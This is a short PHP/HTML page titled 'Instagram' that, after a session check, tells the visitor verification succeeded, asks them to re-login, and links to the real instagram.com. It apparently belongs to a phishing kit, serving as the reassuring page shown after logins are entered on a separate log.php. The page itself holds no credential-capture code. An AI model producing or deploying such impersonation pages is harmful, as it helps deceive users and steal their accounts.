<html lang="en">
<head>
    <link rel="stylesheet" href="log.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />

        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

        
    <title>Instagram</title>
    <style>
        .success
        {
             width:6rem;

             height:6rem;
             border:.2rem solid green;
             background-color:green;
             border-radius:50%;
        
             position:absolute;
             top:50%;
             left:50%;
             transform:translate(-50%,-50%);
        }

        .success i
        {
            color:white;
            font-size:5rem;
            position:absolute;
             top:50%;
             left:50%;
             transform:translate(-50%,-50%);
        }

        a:hover
        {
            text-decoration:none;
        }
      
       #no
       {
         font-size:2rem;

         background:linear-gradient(red,orange,purple,pink);
         color:transparent;
         background-clip:text;
       }
    </style>

      
</head>
<body class="body">

<?php
         
          session_start();

          if(!isset($_SESSION['loggedin']) || $_SESSION['loggedin']!=true){
              header("location: log.php");
               exit;
          }
          


      ?>
<div class="div3"> 
    
        

            <h2 style="margin-bottom:10rem;">Verify Successufully...</h2>
            
            <div class="success">
            <i class="fa-solid fa-check"></i>
           
        </div>
        <p>Please Re-Login</p>
        <a href="https://www.instagram.com"><h2 id="no">Login</h2></a>

     
    </div>
    <?php ?>

    <script>
             function uppercase()
             {
                const x= document.getElementById("user");

                x.value= x.value.toUpperCase();
             }
        </script> 

</body>
</html>